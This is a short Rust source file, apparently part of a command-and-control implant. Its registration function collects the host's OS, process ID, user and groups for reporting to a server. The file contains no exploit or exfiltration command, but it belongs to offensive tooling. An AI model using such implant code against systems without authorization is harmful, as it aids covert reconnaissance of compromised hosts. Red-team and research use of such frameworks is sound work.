use super::info;
use crate::pb::Registration;
use anyhow::Result;

// TODO: write registration for Windows. This is for Linux only
pub fn register() -> Result<Registration> {
    let info = info::Info::new();
    Ok(Registration {
        addr: "".to_string(), // NOTE: The IP address is determined by the server or implant-pivot, not by the implant itself
        os: info.os()?,
        pid: info.pid()?,
        user: Some(info.user()?),
        groups: info.groups()?,
    })
}
